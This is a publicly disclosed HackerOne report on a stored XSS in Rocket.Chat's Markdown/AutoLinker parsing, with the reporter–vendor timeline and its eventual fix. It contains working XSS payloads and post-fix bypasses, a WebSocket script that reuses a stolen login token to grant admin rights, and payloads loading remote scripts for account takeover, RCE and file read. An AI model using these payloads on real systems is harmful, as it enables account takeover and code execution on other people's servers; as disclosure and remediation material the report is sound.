---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/cross-site-scripting-xss-stored
  - env/web
  - vuln/xss
  - impact/account-takeover
  - impact/rce
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2021-03-31
submitted: 2019-11-11T20:25:38.352Z
bounty_usd: null
votes: 41
cve: []
program: "[[programs/rocket_chat|Rocket.Chat]]"
reporter: "sectex"
source: "https://hackerone.com/reports/735638"
title: "Account takeover via XSS"
---
# Account takeover via XSS

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 41 | **Program:** Rocket.Chat | **Disclosed:** 2021-03-31

- Report: [https://hackerone.com/reports/735638](https://hackerone.com/reports/735638)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2019-11-11T20:25:38.352Z

## Report summary

An XSS was reported combining AutoLinker and Markdown. By combining AutoLinker and Markdown one could trick the parser into breaking out of the current HTML attribute, resulting in i.a. the possibility to obtain the login-token of a user.
An initial attempt to fix the problem did not successfully mitigate the problem, as the reporter was able to continue the exploit with minor adjustments.
The reporter suggested various mitigation strategies.
a fix was then released for version 3.11, 3.10.5, 3.9.7, 3.8.8.

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:** By combining AutoLinker and Markdown an attacker is able to inject malicious scripts.

**Description:** By combining AutoLinker and Markdown we can trick the parser into breaking out of the current HTML attribute. 
```
https://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'alert\x28\x27XSS\x27\x29;'instanceof[] target=_blank data-x=`.`)
```
results in:
```html
<a href="https://a?p=<a href=" https:="" style="animation-duration:1s;animation-name:blink;animation-iteration-count:2" onanimationiteration="Array.prototype[Symbol.hasInstance]=eval,'alert\x28\x27XSS\x27\x29;'instanceof[]" target="_blank" data-x="<span" class="copyonly">`<span><code class="code-colors inline">.</code></span><span class="copyonly">`</span>" target="_blank" rel="noopener noreferrer"&gt; </a>
" target="_blank" rel="noopener noreferrer"&gt;https://a?p==!=7vrXTtDtYHrLJ4Z7y=!="
```

To obtain the login-token of the victim we can either use `document.cookie` or `localStorage.getItem('Meteor.loginToken')`.
Since we can authenticate against the websocket using this token, we can perform any actions in the context of the victim (change password, email etc.).

## Releases Affected:

  * Rocket.Chat-Desktop-Client: v2.16.2
  * Rocket.Chat-Server: v2.0.0
  * Apps-Engine-Version: v1.5.2

## Steps To Reproduce (from initial installation to vulnerability):

In this example, the role `admin` is assigned to the desired user as far as the victim has the required permissions.

Code (replace `{ATTACKER_USERID}` and `{ATTACKER_EMAIL}`):
```javascript
    let ws = new WebSocket(`wss://${window.location.host}/sockjs/111/evilwss/websocket`);
    ws.onmessage = function (evt) {
        if (/\["{\\"msg\\":\\"pong\\"}"\]/.test(event.data)) {
            ws.send('["{\\"msg\\":\\"pong\\"}"]');
        }
        if (/a\["{\\"server_id\\":\\"(.*)\\"}"\]/.test(event.data)) {
            ws.send('["{\\"msg\\":\\"connect\\",\\"version\\":\\"1\\",\\"support\\":[\\"1\\",\\"pre2\\",\\"pre1\\"]}"]');
            ws.send(`["{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"resume\\":\\"${localStorage.getItem('Meteor.loginToken')}\\"}],\\"id\\":\\"1\\"}"]`);
        }
        if (/a\["{\\"msg\\":\\"connected\\",\\"session\\":\\"(.*)\\"}"\]/.test(event.data)) {
            ws.send('["{\\"msg\\":\\"method\\",\\"method\\":\\"insertOrUpdateUser\\",\\"params\\":[{\\"_id\\":\\"{ATTACKER_USERID}\\",\\"statusText\\":\\"\\",\\"email\\":\\"{ATTACKER_EMAIL}\\",\\"verified\\":false,\\"password\\":\\"\\",\\"requirePasswordChange\\":false,\\"joinDefaultChannels\\":false,\\"sendWelcomeEmail\\":false,\\"roles\\":[\\"user\\",\\"admin\\"]}],\\"id\\":\\"17\\"}"]');
        }
    };
```
Payload (replace `sectex.dev\x2ffiles\x2fcswsh.js`):
```
https://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'s=document.createElement\x28\x27script\x27\x29;s.src=\x27\x68\x74\x74\x70\x73\x3a\x2f\x2fsectex.dev\x2ffiles\x2fcswsh.js\x27;document.body.appendChild\x28s\x29;'instanceof[] target=_blank data-x=`.`)
```

## Supporting Material/References:

  * {F631806}

## Suggested mitigation

  * Fix initial XSS

## Impact

* Attackers can execute scripts which can lead to:
    * Account takeover
    * Abitrary file read in Rocket.Chat-Desktop
    * RCE in Rocket.Chat-Desktop (#276031)

## Timeline

- **Report Severity Updated**
- **2019-11-12** @sectex: Followed the CVSS Calculator

| Metric              | Value    | Comments                                                            |
| ------------------- |:--------:| -------------------------------------------------------------------:|
| Attack Vector       | Network  | 	A victim/attacker must access a vulnerable system via the network. |
| Attack Complexity   | Low      | |
| Privileges Required | Low      |  An attacker must possess some user level privileges to store the malicious scripts. |
| User Interaction    | Required |  The victim needs to navigate to a web page on the vulnerable server that contains malicious scripts injected by the attacker. |
| Scope               | Changed  |  The vulnerability is in the web server, but the malicious scripts execute in the victim’s browser on their machine. |
| Confidentiality     | High     |  In the worst case, an attacker can create privileged users or perform RCE in Rocket.Chat-Desktop. |
| Integrity           | High     |  In the worst case, an attacker can create privileged users or perform RCE in Rocket.Chat-Desktop. |
| Availability        | High     |  In the worst case, an attacker can deface, or otherwise disrupt service for all users. |
- **2019-11-12** @orangeband: Thanks for your report! We need some more information before we can adequately review this report. Is it possible you could provide a clear step-by-step PoC showing your vulnerability?  Thanks again for your report and we hope to hear back from you soon.

Kind regards.
- **2019-11-12** @sectex: Of course:

* Create an attacker-account and assign the role `user` to it.
* Create an admin-account (or use existing admin-account)
* Login using the attacker-account.
* Open developer-tools and type `document.cookie`.
* Copy the value of `rc_uid`.
* Send the following message to the admin.
   Replace `{ATTACKER_USER_ID}` with the value of `rc_uid`.

   ```
   https://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'s=document.createElement\x28\x27script\x27\x29;s.src=\x27\x68\x74\x74\x70\x73\x3a\x2f\x2fsectex.dev\x2fPoC?user={ATTACKER_USER_ID}\x27;document.body.appendChild\x28s\x29;'instanceof[] target=_blank data-x=`.`)
   ```
* Logout and Login using the admin-account
* Read the message.
* Go to `Administration » Users`
* Observe that the role `admin` was assigned to the attacker-account

Hope this will help. 

Could you please also check the severity of this vulnerability?

Many thanks in advance!
- **2019-11-12** @sectex: Additionally here is a PoC for... 
* RCE vulnerability in Rocket.Chat-Desktop (reported in #276031).
```
https://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'s=document.createElement\x28\x27script\x27\x29;s.src=\x27\x68\x74\x74\x70\x73\x3a\x2f\x2fsectex.dev\x2ffiles\x2frce.js\x27;document.body.appendChild\x28s\x29;'instanceof[] target=_blank data-x=`.`)
```

* Abitrary file read vulnerability in Rocket.Chat-Desktop:
```
https://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'s=document.createElement\x28\x27script\x27\x29;s.src=\x27\x68\x74\x74\x70\x73\x3a\x2f\x2fsectex.dev\x2ffiles\x2fafr.js\x27;document.body.appendChild\x28s\x29;'instanceof[] target=_blank data-x=`.`)
```
- **Report Filed**
- **Report Triaged**
- **2019-11-13** @markus-rocketchat: About your last comment: Are you stating that https://hackerone.com/reports/276031 was not fixed and is still unresolved? Or rather that you used your exploit to get to the same result as in that report?
- **2019-11-13** @sectex: Hi @markus-rocketchat 

Sorry, there was a typo in the script...
I've fixed that and tested it using
    * Chrome (v78.0.3904.97)
    * Firefox (v70.0.1)
    * Edge (v44.17763.771.0)

Unfortunately I do not know how to fix this vulnerability. I can only guess what happens here:
1. Original message: 
   ```
   https://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 
   onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'alert\x28\x27XSS\x27\x29;'instanceof[] 
   target=_blank data-x=`.`)
   ```

2. After parsing `inline-code`: 
   ```html   
   https://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 
   onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'alert\x28\x27XSS\x27\x29;'instanceof[] 
   target=_blank data-x=<span class="copyonly">`</span><span><code class="code-colors inline">.</code></span><span class="copyonly">`</span>)
   ```

3. After parsing `markdown-url`:
   ```html   
   https://a?p=<a href="https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 
   onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'alert\x28\x27XSS\x27\x29;'instanceof[] 
   target=_blank data-x=<span class="copyonly">`</span><span><code class="code-colors inline">.</code></span><span class="copyonly">`</span> " 
   target="_blank" rel="noopener noreferrer"> </a>
   ```

4. After parsing `autolinker-url`:
   ```html
   <a href="<a href="https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 
   onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'alert\x28\x27XSS\x27\x29;'instanceof[] 
   target=_blank data-x=<span class="copyonly">`</span><span><code class="code-colors inline">.</code></span><span class="copyonly">`</span> " 
   target="_blank" rel="noopener noreferrer"> </a>" target="_blank" rel="noopener noreferrer">" target="_blank" rel="noopener noreferrer"&gt;https://a?p==!=bqBSX4RMwXa349QaE=!=</a>
   ```

I'm not sure, but I think url-encoding the values provided to the autolinker should fix it, since this would lead to:
```html
<a href="%3Ca%20href%3D%22https%3A%2F%2F%20style%3Danimation-duration%3A1s%3Banimation-name%3Ablink%3Banimation-iteration-count%3A2%20onanimationiteration%3DArray.prototype%5BSymbol.hasInstance%5D%3Deval%2C%27alert%5Cx28%5Cx27XSS%5Cx27%5Cx29%3B%27instanceof%5B%5D%20target%3D_blank%20data-x%3D%3Cspan%20class%3D%22copyonly%22%3E%60%3C%2Fspan%3E%3Cspan%3E%3Ccode%20class%3D%22code-colors%20inline%22%3E.%3C%2Fcode%3E%3C%2Fspan%3E%3Cspan%20class%3D%22copyonly%22%3E%60%3C%2Fspan%3E%20%22%20target%3D%22_blank%22%20rel%3D%22noopener%20noreferrer%22%3E%20%3C%2Fa%3E">link-text</a>
```


Regarding report #276031: I can confirm that the initial XSS from this report was fixed. 
I only used my exploit to get to the same result as in that report.
- **2019-11-13** @markus-rocketchat: @sectex  thank you for your reply. We are looking into this right now.
- **Report Resolved**
- **2019-11-29** @sectex: Hi @markus-rocketchat,

Nice to hear that, I will have a look at it after work. 
I would like to accept the offer from the feedback. If you need more information on my part, please let me know. 
E-Mail: maik-stegemann@protonmail.com

Best
sectex
- **2019-12-09** @sectex: Hi @markus-rocketchat,

Unfortunately I can not confirm that the issue is fixed.
If I understand correctly the fix relies in the assumption that `new URL(url);` will throw an exception when unintended values are provided ([Commit 15794](https://github.com/RocketChat/Rocket.Chat/pull/15794/commits/d1be45c447a5e3e8dde0327b8c8d7d76cee50e44)).
The initial payload doesn't work anymore, but with some adjustments I'm still able to execute abitrary javascript.

* `alert`-PoC #1

    ```
    https://a?p=[ ](https://a.de? style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration='alert\x280\x29'instanceof{[Symbol.hasInstance]:eval}`.`)
    ```
* `alert`-PoC #2
    ```
    https://a?p=[ ](https://a.de? style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'alert\x280\x29'instanceof[]`.`)
    ```
* Account-Takeover-PoC #1 (replace `{ATTACKER_USER_ID}`):
    ```
    https://a?p=[ ](https://a.de? style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration='s=document.createElement\x28\x27script\x27\x29;s.src=\x27\x68\x74\x74\x70\x73\x3a\x2f\x2fsectex.dev\x2fPoC?user={ATTACKER_USER_ID}&https=true\x27;document.body.appendChild\x28s\x29;'instanceof{[Symbol.hasInstance]:eval}`.`)
    ```
* Account-Takeover-Poc #2 (replace `{ATTACKER_USER_ID}`):
    ```
    https://a?p=[ ](https://a.de? style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'s=document.createElement\x28\x27script\x27\x29;s.src=\x27\x68\x74\x74\x70\x73\x3a\x2f\x2fsectex.dev\x2fPoC?user={ATTACKER_USER_ID}&https=true\x27;document.body.appendChild\x28s\x29;'instanceof[]`.`)
    ```
* RCE in Rocket.Chat-Desktop PoC:
    ```
    https://a?p=[ ](https://a.de? style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'s=document.createElement\x28\x27script\x27\x29;s.src=\x27\x68\x74\x74\x70\x73\x3a\x2f\x2fsectex.dev\x2ffiles\x2frce.js\x27;document.body.appendChild\x28s\x29;'instanceof[] target=_blank data-x=`.`)
    ```

# Releases:
* Rocket.Chat-Server: v3.0.0-develop
* Apps-Engine-Version: v1.11.0
* Rocket.Chat-Desktop: v2.17.0
- **Report Reopened**
- **Report Triaged**
- **2020-07-16** @sectex: Hi @markus-rocketchat,
Any news on this one? 
I've noticed that the payloads don't work anymore because the parser no longer allows spaces (v3.4.2). 
The [release notes of v3.4.0](https://github.com/RocketChat/Rocket.Chat/pull/18078) indicate that the regex to match URL has been changed.
The vulnerability still appears to be exploitable. However, the victim now must click the message.
New PoC:
```
https://a?p=[ ](https://a.de?/onclick='alert\x28\x27XSS\x27\x29'instanceof{[Symbol.hasInstance]:eval}`.`)
```
- **2020-07-28** @markus-rocketchat: Hi @sectex 

yes, we have recently made some changes to prevent attacks like this. Let me check if we can remove the clickable vulnerability as well. Thanks for your update!

Best
Markus
- **2020-08-27** @sectex: Hi @markus-rocketchat,

I think I found a way to fix this, even it's an ugly approach.
My approach is to prevent link rendering when any other markdown-token is present in the url.
To do so, I modified [markdown.js/validateUrl ](https://github.com/RocketChat/Rocket.Chat/blob/develop/app/markdown/lib/parser/original/markdown.js):

```javascript
const validateUrl = (url, presentTokens) => {
	try {
		new URL(url);
		return !(presentTokens 
			&& presentTokens.length > 0 
			&& new RegExp(presentTokens.join("|")).test(url));
	} catch (e) {
		return false;
	}
};
```

Not sure if this helps....

Best
sectex
- **2020-08-28** @markus-rocketchat: Hi @sectex 

thanks a lot for your suggestion! It is always welcome! I will take it to the team and get a response soon. 

Best
Markus
- **2020-10-26** @sectex: Hey @markus-rocketchat,

Is it ok to submit a PR with a decent title so this will be fixed?

Best, sectex
- **2020-10-28** @markus-rocketchat: Hi @sectex 

do you mean like in a private fork or such?

Best regards
- **2020-10-28** @sectex: I mean a pull request with a title like 'improve markdown' or something.
- **2021-01-27** @markus-rocketchat: Hi @sectex 

this should be fixed in 3.11, 3.10.5, 3.9.7, 3.8.8. Can you confirm from your side or if you can still bypass it?

thanks!
- **2021-01-28** @sectex: Hi @markus-rocketchat!

The changes look good to me! (https://github.com/RocketChat/Rocket.Chat/commit/c5cb24ccc28b5ef3116178f851f1752bc7c5deea#diff-94e0ebb0018914f8723474e701339458ef90809dc46f9b148ab01ef63a8f7415)
I tested using v3.10.5 and wasn't able to bypass it.
- **2021-01-28** @markus-rocketchat: Thats great news, @sectex 
thanks for your feedback!
- **2021-02-19** @sectex: Hey @markus-rocketchat,
Can we update the status of this report? 
Thanks in advance.
- **Report Resolved**
- **Agreed On Going Public**
- **2021-03-18** @markus-rocketchat: Hi @sectex 
yes! I added a summary. Is it visible to you?
- **2021-03-18** @sectex: Yes it's visible. Many thanks!
- **Report Became Public**
